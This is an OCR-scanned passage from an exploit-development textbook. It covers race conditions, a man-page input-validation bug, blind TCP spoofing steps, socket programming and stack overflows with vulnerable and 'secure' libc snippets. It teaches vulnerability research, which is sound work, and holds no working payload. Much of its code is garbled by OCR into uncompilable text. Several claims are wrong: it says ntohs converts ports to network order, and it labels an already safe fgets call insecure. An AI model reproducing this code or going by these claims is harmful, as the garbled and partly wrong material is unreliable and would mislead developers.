Race Conditions 
Race conditions occur when a dependence on a timed event can be violated. For 
example, an insecure program might check to see if the file permissions on a file would 
allow for the end user to access the file. After the check succeeded, but before the file 
was actually accessed, the attacker would link the file to a different file that the attacker 
would not have legitimate access to. This type of bug is also referred to as a Time Of 
Check Time Of Use (TOCTOU) bug because the program checks for a certain condi-
tion and before the certain condition is utilized by the program, the attacker changes an 
outside dependency that would have caused the time of check to return a different value 
(such as access denied instead of access granted). 
File Race Conditions 
The most common type of race condition involves files. File race conditions often 
involve exploiting a timed non-atomic condition. For instance, a program may create a 
temporary file in the /tmp directory, write data to the file, read data from the file, 
remove the file, and then exit. In between all of those stages, depending on the calls used 
and the exact implementation method, it may be possible for an attacker to change the 
conditions that are being checked by the program. 
Consider the following scenario: 
1. Start the program. 
2. 
Program checks to see if a file named /tmp/programname.lock.001 exists. 
3. 
If it doesn't exist, create the file with the proper permissions. 
4. Write the pid (process id) of the program's process to the lock file. 
5. At a later time, read the pid from the lock file. 
6. 
When the program has finished, remove the lock file. 

Writing Exploits I • Chapter 10 
431 
Even though some critical security steps are lacking and some of the steps are cer-
tainly not ideal, this scenario provides a simple context for us to examine race conditions 
more closely. Consider the following questions with respect to the scenario: 
• 
What happens if the file does not exist in step 2, but before step 3 is executed 
the attacker creates a symbolic link from that file to a file the attacker controls, 
such as another file in the /tmp directory? (A symbolic link is similar to a 
pointer; it allows a file to be accessed under a different name via a potentially 
different location. When a user attempts to access a file that is actually a sym-
bolic link, the user is redirected to the file that is linked to. Because of this 
redirection, all file permissions are inherently the same.) What if the attacker 
doesn't have access to the linked file? 
• 
What are the permissions of the lock file? Can the attacker write a new 
Process ID (PID) to the file? Or can the attacker, through a previous symbolic 
link, choose the file and hence the PID? 
• 
What happens if the PID is no longer valid because the process died? What 
happens if a completely different program now utilizes that same PID? 
• 
When the lock file is removed, what happens if the lock file is actually a sym-
bolic link to a file the attacker doesn't have write access to? 
These questions all demonstrate methods or points of attack that an attacker could 
attempt to utilize in order to subvert control of the application or system. Trusting lock 
files, relying on temporary files, and utilizing functions like mkstemp all require careful 
planning and considerations. 
Signal Race Conditions 
Signal race conditions are very similar to file race conditions. The program checks for a 
certain condition, an attacker sends a signal triggering a different condition, and when 
the program executes instructions based on the previous condition, a different behavior 
occurs. A critical signal race condition bug was found in the popular mail package send-
mail. Because of a signal handler race condition reentry bug in sendmail, an attacker was 
about to exploit a double free heap corruption bug. 
The following is a simplified sendmail race condition execution flow; 
1. Attacker sends SIGHUP 
2. 
Signal handler function is called; memory is freed. 
3. Attacker sends SIGTERM. 
4. 
Signal handler function is called again; same pointers are freed. 
Freeing the same allocated memory twice is a typical and commonly exploitable heap 
corruption bug." Although signal race conditions are most commonly found in local appli-
cations, some remote server applications implement SIGURG signal handlers that can 
receive signals remotely. Signal urgent (SIGURG) is a signal handler that is called when 
out of band data is received by the socket. Thus, in a remote signal race condition scenario, 

432 
Chapter 10 * Writing Exploits I 
a remote attacker could perform the precursor steps, wait for the application to perform 
the check, then send out of band data to the socket and have the urgent signal handler 
called. In this case, a vulnerable application may allow reentry of the same signal handler 
and if two signal urgents were received, the attack could potentially lead to a double free 
bug. 
Race conditions are fundamentally logic errors that are based on assumptions. A 
programmer incorrectly assumes that in between checking a condition and performing a 
function based on the condition, the condition has not changed.These types of bugs can 
occur locally or remotely; however, they tend to be easier to find and more likely to be 
exploited locally. This is because if the race condition occurs remotely, an attacker may 
not necessarily have the ability to perform the condition change after the application's 
condition check within the desired time range (potentially fractions of a millisecond). 
Local race conditions are more likely to involve scenarios that are directly controllable 
by the attacker. 
It is important to note that race conditions are not restricted to files and signals. Any 
type of event that is checked by a program and then, depending on the result, leads to 
the execution of certain code could theoretically be susceptible. Furthermore, just 
because a race condition is present, doesn't necessarily mean the attacker can trigger the 
condition in the window of time required, or have direct control over memory or files 
that he or she didn't previously have access to. 
Case Study: man Input Validation Error 
An input validation error exists in "man" version 1.5. The bug, fixed by man version 
1.51, allows for local privilege escalation and arbitrary code execution. When man pages 
are viewed using man, the pages are insecurely parsed in such a way that a malicious 
man page could contain code that would be executed by the help-seeking user. 
Vulnerability Details 
Even when source code is available, vulnerabilities can often be difficult to track down. 
The following code snippets from nian-1.5k/src/util.c illustrate that multiple functions 
often must be examined in order to find the impact of a vulnerability. All in all, this is a 
rather trivial vulnerability, but it does show how tunction tracing and code paths are 
important to bug validation. 
The first snippet shows that a systemf) call utilizes end-user input for an execv call. 
Passing end-user data to an exec function requires careful preparsing of input. 
SYHfntss 
1 
S t a t i c irtt 
2 systemO (const char ^command) t 
3 
int pidr pid2 , status; 
4 
5 
pid = forkO; 
6 
if (pid == -]-> { 
7 
perror(progname); 
8 
f a t a l 
ICANNOT_FORK, 
command); 
9 
} 
10 
if (pid == 0) ( 

Writing Exploits I • Chapter 10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
char *argv[4]; 
argv[01 = "sh"; 
argv[ll = "-C*; 
argv[2I = {char *) command; 
argv[31 = 0; 
execvl"/bin/sh", argv); 
/* was: execvet*, 
exit(127); 
) 
do ! 
pid2 = wait(Sistatus}; 
if (pid2 == -1) 
return - 1 ; 
) while(pid2 != pid); 
return status; 
*,environ) 
25 ] 
;?M^. 
In this second snippet, the data is copied into the buffer and, before being passed to 
I the system!) call, goes through a sanity check (the is_shell_safe function call). 
1 char * 
2 my_xsprintf (char *formatj ...) { 
3 
va_list p; 
4 
char *s, *ss, *fm; 
5 
int leni 
6 
7 
len = strlen (format:) + 1; 
8 
fni = my_strdup(format); 
9 
10 
va_start(pH 
format); 
11 
for Is e fm; *s; s++) ( 
1 2 
i f 
<*s == 
•%') 
{ 
13 
switch (s[l]l { 
1 4 
case ' Qh : 
15 
case ' S ' : /* check arid turn into '$• *J 
16 
ss = va_arg(p, char *) ; 
17 
if (!is_shell_safe(ss, 
(s[l] == 'Q•J)) 
IS 
return NOT_SAFE; 
19 
len •*-= strlen (ss); 
20 
s£l] = ' s ' ; 
21 
break; 
,,,j, [„ 
The following is the preparsing sanity check. 
1 
Ftdeftne NOT_SAFE "unsafe" 
2 
3 
s t a t i c int 
4 
is_shell_safe(const char *ssH int quoted) { 
allow a space inside quotes 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 } 
char "bad = " ; ' \ \ \ " < > | "; 
char 'p; 
if 
(quoted) 
bad++; 
for(p = bad; *p; p++) 
if(index(ss, 
*p)) 
return 0; 
return 1; 
When the my_xsprintf function call in the util.e man source encounters a mal-
formed string within the man page, it will return NOT_SAFE. Unfortunately, instead of 

434 
Chapter 10 * Writing Exploits I 
returning unsafe as a string, it returns unsafe and is passed directly to a wrapped system 
call. Therefore, if an executable named "unsafe" is present within the user's (or root's) 
path, then the "unsafe" binary is executed. This is obviously a low risk issue because 
most likely an attacker would need to have escalated privileges to even write the mali-
cious man page to a folder that is within the end user's PATH; if this were the case, the 
attacker would most likely already have access to the target user's account. However, the 
man input validation error illustrates how a nonoverflow input validation problem (such 
as lack of input sanitization or even error handling) can lead to a security vulnerability. 
Not all vulnerabilities, even local arbitrary code execution, are a result of software 
bugs. Many application vulnerabilities, especially Web "vulnerabilities," are mainly logic 
error and lack of input validation vulnerabilities. For example, cross-site scripting attacks 
are simply input validation errors where the processing of input lacks proper filtering. 

Writing Exploits I * Chapter 10 
435 
Summary 
Writing fully functional exploits is no easy task, especially if it is an exploit for a vulner-
ability that has been personally identified in a closed source application. In general, the 
process of writing exploits, whether it be local or remote is very similar with the only 
key difference being that remote exploits must contain socket code to connect the host 
system to the vulnerable target system or application. Typically, both types of exploits 
contain shellcodc which can be executed to spawn command-line access, modify file 
system files, or merely open a listening port on the target systems that could be consid-
ered a Trojan or backdoor. 
Protocol-based vulnerabilities can be extremely dangerous and usually result in sys-
temwide denial-of-service conditions. Due to the nature of these vulnerabilities, they are 
usually much more difficult to protect against and patch when one is identified.These 
types of vulnerabilities are difficult because in most cases they are the means for application 
communication, thereby it is possible for numerous applications to be susceptible to an 
attack, simply because they have implemented that protocol for one reason or another. 
Nearly all race condition exploits are written from a local attacker's perspective and 
have the potential to escalate privileges, overwrite files, or compromise superuser-privi-
lege-only data. These types of exploits are some of the most difficult to write, in addi-
tion to it being a common practice to run them multiple times before a successful 
exploitation occurs. 
Solutions Fast Track 
Targeting Vulnerabilities 
0 
When searching for new vulnerabilities, all areas of attack should be examined. 
These areas of attack should include: source code availability, the number of 
people that may have already looked at this source code or program (and who 
they are), whether automated vulnerability assessment fuzzing is worth the 
time, and the expected length of time it will take to set up a test environment. 
Remote and Local Exploits 
0 Services such as Apache, IIS, and OpenSSI I run under restricted nonprivileged 
accounts to mitigate damage if the service is remotely compromised. 
0 
Local exploits are often necessary to escalate privileges to superuser or 
administrator level, given the enhanced security within applications. 

436 
Chapter 10 • Writing Exploits I 
k 
Format String Attacks 
0 
Format string bugs are present when no formatting characters are specified as 
an argument for a function that utilizes va_arg style argument lists. 
0 
Common houses for format string vulnerabilities are found in statements such 
as priiitf(ar<>v[1j). The quick fix for this problem is to place a "%&" instead of the 
ar$v[l] argument.The corrected statement would look like priutf("%s", argv(lj). 
TCP/IP Vulnerabilities 
0 
The purpose of a TCP spoofing attack is to exploit a trust relationship 
between two systems.The attacker must know in advance that host A trusts 
host B completely. An example attack works like this: An attacker sends some 
SYN packets to a target A system to start to understand how the sequence 
numbers are being generated.The attacker then begins a l)enial-of-Service 
attack against host B in order to prevent it from sending any RST packets. The 
TCP packet is spoofed from host 13 to host A with the appropriate sequence 
numbers.The appropriate packets are then spoofed until the attacker's goal is 
accomplished (e-niailing password files, changing a password on the machine, 
and so on). One note about this blind attack is that the attacker will never see 
any responses actually sent from host A to host B. 
Race Conditions 
0 
Signal race conditions are very similar to file race conditions. The program 
checks for a certain condition, an attacker sends a signal triggering a different 
condition, and when the program executes instructions based on the previous 
condition, a different behavior occurs. A critical signal race condition bug was 
found in the popular mail package Sendmail. 
0 
Signal race conditions are most commonly found in local applications. Some 
remote server applications implement SIGURG signal handlers that can 
receive signals remotely. Signal urgent (SIGURG) is a signal handler that is 
called when out-of-band data is received by the socket. 
Links to Sites 
0 
http://razor.bindview.com/publish/papers/tcpseq.html An interesting 
paper on random number generation. 
0 
www.striker.ottawa.on.ca/~aland/pscan/ A freeware source code scanner 
that can identify format string vulnerabilities via source. 
www.syngress.com 

Writing Exploits I * Chapter 10 
437 
0 
www.applicationdefense.com Application Defense will house all of the 
code presented throughout this book. Application defense also has a 
commercial software product that identifies format string vulnerabilities in 
applications through static source code analysis, 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Q: Are all vulnerabilities exploitable on all applicable architectures? 
Al Not always. Occasionally, because of stack layout or buffer sizes, a vulnerability 
may be exploitable on some architectures but not others. 
Q: If a firewall is filtering a port that has a vulnerable application listening but not 
accessible, is the vulnerability not exploitable? 
Al Not necessarily. The vulnerability' could still be exploited from behind the fire-
wall, locally on the server, or potentially through another legitimate application 
accessible through the firewall. 
Q: Why isn't publishing vulnerabilities made illegal? Wouldn't that stop hosts from 
being compromised/^^. 
A: Without getting into too much politics, no it would not. Reporting a vulnera-
bility is comparable to a consumer report about faulty or unsafe tires. Even if the 
information were not published, individual hackers would continue to discover 
and exploit vulnerabilities. 
fc-* 
Q: Are format string vulnerabilities dead? 
A: As of late, in widely used applications, they are rarely found because they can't be 
quickly checked for in the code . 
Ql What is the best way to prevent software vulnerabilities? 
A: A combination of developer education for defensive programming techniques as 
well as software reviews is the best initial approach to improving the security of 
custom software. 
www.syngress.com 


Chapter 11 
Writing Exploits II 
Solutions in this Chapter: 
Coding Sockets and Binding for Exploits 
Stack Overflow Exploits 
Heap Corruption Exploits 
Integer Bug Exploits 
Case Studies 
• 
• 
Related Chapters: Chapter 10, Chapter 12, 
Chapter 13, Chapter 14 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 
439 

440 
Chapter 11 * Writing Exploits II 
Introduction 
The previous chapter focused on writing exploits, particularly format string attacks and 
race conditions. In this chapter, we will focus on exploiting overflow-related vulnerabili-
ties, including stack overflows, heap corruption, and integer bugs. 
Buffer overflows and similar software bugs that have security implications exist 
largely because software development firms don't believe that making software more 
secure will positively affect the bottom line. Rapid release cycles and the priority of 
"time to market" over anything else will never end. Few large software development 
organizations publicly claim to develop secure software. Most that announce this usually 
receive immediate negative press, at least in the security community, which not only 
contradicts their claims but puts the company in a less than flattering light. Due to poli-
tics, misunderstandings, and the availability of a large code base, some organizations are 
consistently targeted by bug researchers seeking glory in the press. Companies with few 
public software bugs achieve this mainly by staying under the radar. 
Interestingly enough, multiple organizations that develop security software also have 
been subject to the negative press of having a vulnerability in their security software. 
Even developers who are aware of the security implications of code can make errors. For 
instance, on one occasion, a well-known security researcher released a software tool to 
the community for free use. Later, a vulnerability was found in that software. This is 
understandable, since everyone makes mistakes and bugs are often hard to spot. What is 
more ironic is that when the security researcher released a patch, the patch created 
another vulnerability and the person who found the original bug proceeded to publicly 
point out the second bug. 
No vendor is 100-percent immune to bugs. Bugs will always be found and, at least 
for a while, will most likely be found at an increasing rate.To decrease the likelihood of 
a bug being found in in-house developed software, an organization should start by 
decreasing the number of bugs in the software. This may seem obvious, but some soft-
ware development organizations have instead gone the route of employing obfuscation 
or risk mitigation techniques within their software or operating system. These tech-
niques tend to be flawed and are broken or subverted within a short amount of time. 
The ideal scenario to help decrease the number of bugs in software is for in-house 
developers to become more aware of the security implications of code they write or uti-
lize (such as libraries) and have that code frequently reviewed. 
Coding Sockets and Binding for Exploits 
Due to the nature of coding exploits, one must have a basic knowledge of network 
sockets programming. In this section, we will focus on the BSD socket API and how to 
perform the basic operations of network programming in regards to exploit develop-
ment. For a more detailed analysis of BSD sockets, please refer to Chapter 3. The fol-
lowing coverage focuses on functions and system calls that will be used and 
implemented in programs and exploits throughout this chapter. 

Writing Exploits II • Chapter 11 
441 
Client-Side Socket Programming 
In a client-server programming model, client-side programming is when an application 
makes a connection to a remote server. Not too many fimctions are actually needed to 
perform the action of creating an outgoing connection. The functions that will be cov-
ered in this section are socket and connect. 
The most basic operation in network programming is to open a socket descriptor, 
The usage of the socket function follows: 
int socket(int domain, int type, int protocol) 
The domain parameter specifies the method of communication. In most cases of 
TCP/IP sockets, the domain AF_INET is used.The type parameter specifies how the 
communication will occur. For a TCP connection the type SOCK_STREAM is used, 
and for a UDP connection the type SOCK_DGRAM is used. Lastly, the protocol 
parameter specifies the network protocol that is to be used for this socket. The socket 
function returns a socket descriptor to an initialized socket. 
An example of opening up a TCP socket is: 
sockfd = socket (AF„INET, SOCK_STREAM, 0 ) ; 
An example of opening a UDP socket is: 
sockfd = socket[AF_rNET, SOCK_DGRAM, 
0); 
After a socket descriptor has been opened using the socket function, we use the 
connect function to establish connectivity. 
int connect(int sockfd, const struct sockaddr *serv_addr, socklen^t addrlen); 
The sockfd parameter is the initialized socket descriptor.The socket function must 
always be called to initialize a socket descriptor before attempting to establish the con-
nection.The serv_addr structure contains the destination port and address. Lastly, the 
(tddrkit parameter contains the length of the sen>_addr structure. Upon success, the con-
nect function returns the value of 0, and upon error,-1. Example 11.1 shows the socket 
address structure. 
_Ilil_. Example 11.1 The Socket Address Structure 
• • ^ ^ ^ ^ 
1 
struct sockaddr_in 
2 
[ 
3 
in_port_t sinj>ort; 
/* Port number, */ 
4 
struct in_addr sin_addr; 
f* Internet address. V 
5 
sa_£amily_t sin_family; 
/* Address family, */ 
6 
],-
Analysis 
Before the connect function is called, the following structures must be appropriately 
defined: 

Chapter 11 * Writing Exploits II 
• 
The $'tn_port element of $ockaddr_tn structure (line 3) This element con-
tains the port number to be connected to.The value must be converted to net-
work byte order using the ntohs function. 
• 
The sin_addr element (line 4) This element simply contains the Internet 
address of the host we are trying ro connect to. Commonly, the inet_addr 
function is used to convert the ASCII IP address into the actual binary data. 
• 
The sin_famity element (line 5) This element contains the address family, 
which in almost all cases is set to AF_INET 
Example 11.2 shows filling the sockaddrjin structure and performing a TCP connect. 
Example 11.2 Initializing a Socket and Connecting 
1 
struct sockaddr_irt sin; 
2 
int sockfd; 
3 
4 sockfd = socket(AF_INET, SOCK_STR£AM, 0 ) ; 
5 
6 
sin.sitt_port = htons(80) ; 
7 
sin.sin_family • AF_T.NET; 
8 
sinTsin_addrTs_adclr - ixiet_addr("127 ,0,0,1n) ; 
9 
10 
connect(sockfd, 
(struct sockaddr *)&sinr sizeof tsin) ); 
Analysis 
On line 6, we specified the port within the htons function to place the number 80 in 
network byte order. This block of code simply creates a socket (line 4), fills out the 
socket address information (lines 6 through 8) and performs a connect (line 10). These 
are the three ingredients needed to create a connection to a remote host. If we wanted 
to open a UDP socket as opposed to a TCP socket, we would only have to change the 
SOCK_STREAM on line 
14 to SOCK_DGRAM. 
After the connection has been established successfully, the standard I/O functions 
such as read and wrire can be used on the socket descriptor. 
Server-Side Socket Programming 
Server-side socket programming involves writing a piece of code that listens on a port 
and processes incoming connections. When writing exploits, there are times this is 
needed, such as when using connect-back sheUcode.To perform the basic needs for cre-
ating a server, four functions are called. These functions include socket, bind, listen, and 
accept. In this section, we will cover the functions bind, listen, and accept. 
The purpose of the bind function is to bind a name to a socket. The actual function 
usage looks like the following: 
int bindfint sock£dH struct sc-ckaddr tmy_addr^ sockien_t addrlen) ; 
The function bind gives the socket descriptor specified by sockfd the local address of 
my_addr. The ni)'__(itidr structure has the same elements as described in the client-side 

Writing Exploits II • Chapter 11 
socket programming section, but it is used to connect to the local machine instead of a 
remote host. When filling out the sockaddr structure, the port to bind to is placed in the 
si)i_])ort element in network byte order, while the siu_addr.s_addr clement is set to O.The 
bind function returns 0 upon success, and —1 upon error. 
The listen function listens for connections on a socket.The usage is quite simple: 
int listen{int sockfd, int backlog) 
This function takes a socket descriptor, initialized by the bind function and places it 
into a listening state.The sockfd parameter is the initialized socket descriptor. The backlog 
parameter is the number of connections that are to be placed in the connection queue. 
If the number of connections is maxed out in the queue, the client may receive a "con-
nection refused" message while trying to connect.The listen function returns 0 upon 
success and —1 upon error. 
The purpose of the accept function is to accept a connection on an initialized 
socket descriptor. The function usage follows: 
int accept[int s, struct sockaddr *addr, socklen_t *addrlen); 
This function removes the first connection request in the queue and returns a new 
socket descriptor to this connection.The parameter s contains the socket descriptor of 
the socket initialized using the bind function.The addr parameter is a pointer to the sock-
addr structure that is filled out by the accept function, containing the information of the 
connecting host.The addrlot parameter is a pointer to an integer that is filled out by 
accept, and contains the length of the addr structure. Lastly, the function accept returns a 
socket descriptor on success and upon error returns —1. 
Piecing these functions together, we can create a small application, shown in 
Example 11.3, that binds a socket to a port. 
1 ^ ^ , Example 11.3 Creating a Server 
1 
int main (void) 
2 
{ 
3 
int si, 32; 
4 
struct sockaddr_iii sin; 
5 
6 
si = socket (AF_IWET, SOCK_STREAM, 0); 
// Create a TCP socket 
7 
8 
sin*sin_port - htons16666}? // Listen on port 6666 
9 
sin.sin„family = AF_INETj 
10 
sin^sin^ddr .s_addr - 0j 
/i Accept connections from anyone 
ii 
12 
bind(sockfd, {struct sockaddr *)&sin, sizeof(sin)); 
13 
14 
listen(sockfd, 5) ; 
// 5 connections maximum for the queue 
15 
16 
s2 = accept(sockfd, NULL, 0) ; // Accept a connection from queue 
17 
18 
write{s2, "hellcAn", 6)7 
ft Say hello to the client 
19 ) 

444 
Chapter 11 * Writing Exploits II 
Analysis 
This program simply creates a server on port 6666 and writes the phrase hello to clients 
who connect. As you can see, we used all functions that have been reviewed in this sec-
tion. On line 6, we use the socket function to create a TCP socket descriptor. We pro-
ceed to rill out the sockaddr structure on lines 8 through 10.The socket information is 
then named to the socket descriptor using the bind function. The listen function is used 
to place the initialized socket into a listening state, and, lasdy, the connection is accepted 
from the queue using the accept function. 
Stack Overflow Exploits 
Traditionally, stack-based buffer overflows have been considered the most common type 
of exploitable programming errors found in software applications today. A stack overflow 
occurs when data is written past a buffer in the stack space, causing unpredictability that 
can often lead to compromise. 
Since stack overflows have, in the eyes of the non-security community, been the 
prime focus of security vulnerability education, these bugs are becoming less prevalent in 
mainstream software. However, they are still important to be aware of and look for. 
Memory Organization 
Memory is not organized the same way on all hardware architectures. This section covers 
only the 32-bit Intel architecture (x86, henceforth referred to as 1A32) because it is cur-
rently the most widely used hardware platform. In the future, this will almost certainly 
change because IA64 is slowly replacing IA32 and because other competing architec-
tures (SPARC, MIPS, PowerPC, or HPPA) may become more prevalent as well. The 
SPARC architecture is a popular alternative that is utilized as the native platform of the 
Sun Solaris operating system. Similarly, IRIX systems are typically on MIPS architecture 
hosts, AIX is typically on PowerPC hosts, and HP-UX is typically on hosts with the 
HPPA architecture. We will consider some comparisons between IA32 and other archi-
tectures. For general hardware architecture information, refer to free public online man-
uals distributed by the manufacturers. 
Figure 11.1 shows the stack organization for the 1A32. Among other things, the 
stack stores parameters, buffers, and return addresses for functions. On IA32 systems, the 
stack grows downward (unlike the stack on the SPARC architecture that grows 
upward). Variables are pushed to the stack on an IA32 system, and are done so in a Last 
In First Out (LIFO) manner.The data that is most recently pushed to the stack is the 
first popped from the stack. 
Figure 11.2 shows two buffers being "pushed" onto the stack. First, the bufl buffer is 
pushed on to the stack; later, the bufl buffer is pushed on to the stack. 
Figure 11.3 illustrates the LIFO implementation on the IA32 stack. The second 
buffer, buf2, was the last buffer pushed onto the stack.Therefore, when a push operation 
is done, it is the first buffer popped off of the stack. 

Writing Exploits II • Chapter 11 
445 
Figure 11.1 IA32 (Intel 32-Bit x86 Architecture) Stack Diagram 
Frame Pointer 
(EBP) 
Instruction Pointer 
(EIP) 
Local variables, buffers. 
other registers, etc 
Figure 11.2 Two Buffers Pushed to 
/ 
bu(2[128| 
buM(512] 
' 
Frame Pointer 
(EBP) 
Instruction Pointer 
(EIP) 
an 
-
• 
r 
IA32 Stack 
Local variables, buffers, 
other registers, ate 
Figure 11.3 One Buffer Popped from an IA32 Stack 
/ 
/ 
bud [512) 
' 
i 
• 
-
Rarne Pointer 
(EBP) 
Instruction Pointer 
(EIP) 
i 
Local vdidlj es, buffers. 
other registers, etc 
1 

446 
Chapter 11 * Writing Exploits II 
Stack Overflows 
All stack overflows are buffer overflows; however, not all buffer overflows are stack over-
flows. A buffer overflow refers to the size of a buffer being incorrectly calculated in such 
a manner that more data may be written to the destination buffer than originally 
expected. All stack overflows fit this scenario. Many buffer overflows affect dynamic 
memory stored on the heap; this will be covered in the "Heap Corruption" section later 
in this section. Furthermore, not all buffer overflows or stack overflows are exploitable. 
Different implementations of standard library functions, architecture differences, oper-
ating-system controls, and program variable layouts are all examples of things that may 
cause a given stack overflow bug to not be practically exploitable in the wild. However, 
with that said, most stack overflows are exploitable. 
In Figure 11.4, the buf2 buffer was filled with more data than expected by the pro-
grammer, and the bufl buffer was completely overwritten with data supplied by the 
malicious end user to the buf2 buffer. Furthermore, the rest of the stack, most impor-
tantly the instruction pointer (EIP), was overwritten as well.The EIP register stores the 
function's return address.Thus, the malicious attacker can now choose which memory 
address is returned to by the calling function. 
Figure 11.4 IA32 Stack Overflow 
Original buffer 
Overwritten buffer 
Return address 
An entire book could be devoted to explaining die security implications of func-
tions found in standard C libraries (referred to as LIBC), the differences in implementa-
tions across different operating systems, and the exploitability of such problems across 
different architectures and operating systems. Over a hundred functions within LIBC 
have security implications.These implications vary from something as little as "pseudo-
randomness not sufficiently pseudorandom" (for example, srandfj) to "may yield remote 
administrative privileges to a remote attacker if the function is implemented incorrectly" 
(for example, printf()). 
The following functions within LIBC contain security implications that facilitate 
stack overflows. In some cases, other classes of problems could also be present. In addi-
tion to listing the vulnerable LIBC function prototype, a verbal description of the 
problem, and code snippets for vulnerable and not vulnerable code are included. 
buf2[12$) 
but 1 [512) 
/ 
/ 
/ 
> 
/ 
Frame Pointer 
(EBP) 
/ 
Instructor Pointer 
(EIP) 
Local variables bufters. 
ffJwr r&Qislars. &:c 
Memory completely under ihe 
attacker's coni ml 

Writing Exploits II • Chapter 11 
j;, vup*E ss| ] Function name: strcpy 
••;:•••:••' 
2 Class: Stack Overflow 
3 Prototype; char *strcpy(char *dest„ const char *src); 
4 
Include: ftinclude <string.h> 
5 Description: 
6 
If the source buffer is greater than the destination buffer, an overflow will occur. 
AlsoH ensure that the destination buffer is null terminated to prevent future functions 
that utilize the destination buffer from having any problems. 
7 
8 
Example insecure implementation snippet: 
9 
char dest[20]; 
10 strcpy (dest, argv[l]>; 
11 
12 Example secure implementation snippet: 
13 char dest[20] - {0}; 
14 if(argv[l]) strncpy(dest, argv[l], sizeof (dest) -1) ; 
15 
16 Function name; strncpy 
17 Class; Stack Overflow 
18 Prototype: char *strncpy(char *dest, const char *src, size_t n) j 
19 Include: finclude <string.h> 
20 
Description: 
21 
If the source buffer is greater than the destination buffer and the size is 
miscalculated, an overflow will occur. Also, ensure that the destination buffer is null 
terminated to prevent future functions that utilize the destination buffer from having 
any problems• 
22 
23 
Example insecure implementation snippet: 
24 char dest[20] ; 
25 
strncpy(dest, argv[lJ r sizeof(dest)); 
26 
27 
Example secure implementation snippet: 
28 char dest[20] = {0}; 
29 
if(argvll]) strncpy (dest, argvIUj sizeof (dest) -1) ; 
30 
31 Function name: strcat 
32 
Class: Stack Overflow 
33 
Prototype: char *streat(char *dest, const char +src); 
34 
Include: ^include <string.h> 
35 
Description: 
36 
if the source buffer is greater than the destination buffer, an overflow will occur. 
Also, ensure that the destination buffer is null terminated both prior to and after 
function usage to prevent future functions that utilize the destination buffer from 
having any problems. Concatenation functions assume the destination buffer to already 
be null terminated. 
37 
38 
Example insecure implementation snippet t 
39 char dest[20]; 
40 strcat(dest, argv[l]); 
41 
42 
Example secure implementation snippet; 
43 
char dest[20] - {0}; 
44 
if(argv[ll) strncat(destH argvll], sizeof(dest)-1); 
45 
46 
Function name: strncat 
47 
Class: Stack Overflow 
48 
Prototype: char *strncat(char *dest, const char *srcH size_t n); 
49 
Include: ttinclude ^string.h> 

448 
Chapter 11 * Writing Exploits II 
50 Description: 
51 If the source buffer is greater than the destination buffer and the size is 
miscalculated, an overflow will occur. Also, ensure that the destination buffer is null 
terminated both prior to and after function usage to prevent future functions that 
utilize the destination buffer from having any problems. Concatenation functions assume 
the destination buffer to already be null terminated, 
52 
53 Example insecure implementation snippet: 
54 char dest[20]; 
55 strncat(destr argv[l], sizeof{dest)-1) ; 
56 
57 Example secure implementation snippet: 
58 char dest(20] = {0}; 
59 
if(argv(l]) strncat(dest, argv[lJ , sizeof(dest)-1); 
60 
61 
Function name: sprintf 
62 
class: Stack Overflow and Format String 
63 
Prototype: 
int sprintf(char *str, 
const char *format, 
...)-, 
64 
Include: #include <stdio.h> 
65 
Description: 
66 
if the source buffer is greater than the destination buffer, an overflow will occur. 
Also, ensure that the destination buffer is null terminated to prevent future functions 
that utilize the destination buffer from having any problems. If the format string is 
not specified, memory manipulation can potentially occur. 
67 
68 Example insecure implementation snippet: 
69 char dest(20]; 
70 sprintf(dest, argv[l]); 
71 
72 Example secure implementation snippet: 
73 char dest[20] = {0}; 
74 if(argv(l]) snprintf(dest, sizeof(dest)-1, "%s", argv[l]); 
75 
76 Function name: snprintf 
77 Class: Stack Overflow and Format String 
78 Prototype: int snprintf(char *str H size_t sizeH const char * formatH ^ . . ) ; 
79 
Include: #include <stdiorh> 
80 Description: 
81 
If the source buffer is greater than the destination buffer and the size is 
miscalculated, an overflow will occur. Also, ensure that the destination buffer is null 
terminated to prevent future functions that utilize the destination buffer from having 
any problems. If the format string is not specified, memory manipulation can potentially 
occur. 
82 
83 Example insecure implementation snippet: 
84 char dest[20]; 
85 snprintf(dest, sizeof(dest), argv[l]); 
86 
87 
Example secure implementation snippet: 
88 
char dest(20] = (0): 
89 
if(argv[l]) snprintf(dest, sizeof(dest)-1, 
"%s", a r g v l l l ) ; 
90 
91 Function name: gets 
92 Class: Stack Overflow 
93 Prototype: char *gets(char *s}; 
94 Include: #include <stdio.h> 
95 Description: 

Writing Exploits II * Chapter 11 
449 
96 If the source buffer is greater than the destination buffer, an overflow will occur. 
Also, ensure that the destination buffer is null terminated to prevent future functions 
that utilize the destination buffer from having any problems. 
97 
98 Example insecure implementation snippet: 
99 char dest[20]; 
100 gets(dest) ; 
101 
102 Example secure implementation snippet: 
103 char dest[20] = CO}; 
104 fget£{dest, s-izeof (des-t) -1, stdin} j 
105 
1 06 Function name: fgets 
107 Class: 
Buffer Overflow 
108 Prototype: char *fgets(char *s, int size, FILE *stream}; 
109 Include: #include <stdio.h> 
110 Description: 
111 if the source buffer is greater than the destination buffer, an overflow will occur, 
Alsor ensure that the destination buffer is null terminated to prevent future functions 
that utilize the destination buffer from having any problems. 
112 
113 Example insecure implementation snippet: 
114char dest[20] i 
115 fgets{dest, sizeof(dest), stdin); 
116 
117 Example secure implementation snippet: 
118char dest[20] = {0}; 
119 fgetsfdest, 
sizeof(dest)-1, 
s t d i n ) ; 
Many security vulnerabilities are stack-based overflows affecting the preceding and 
similar functions. However, these vulnerabilities tend to be found only in rarely used or 
closed-source software. Stack overflows that originate due to a misusage of LIBC func-
tions are very easy to spot, so widely used open-source software has largely been 
scrubbed of these problems. In widely used closed-source software, all types of bugs tend 
to be found. 
Finding Exploitable Stack 
Overflows in Open-Source Software 
To find bugs in closed-source software, at least a small amount of reverse engineering is 
often required. The goal of this reverse engineering is to revert the software to its pre-
compiled (source) state.This approach is not needed for open-source software because 
the actual source code is present in its entirety. 
Fundamentally, only two techniques exist for finding exploitable stack overflows in 
open-source software: automated parsing of code via tools, and manual analysis of the 
code (yes, the latter means reading the code line by line). With respect to the first tech-
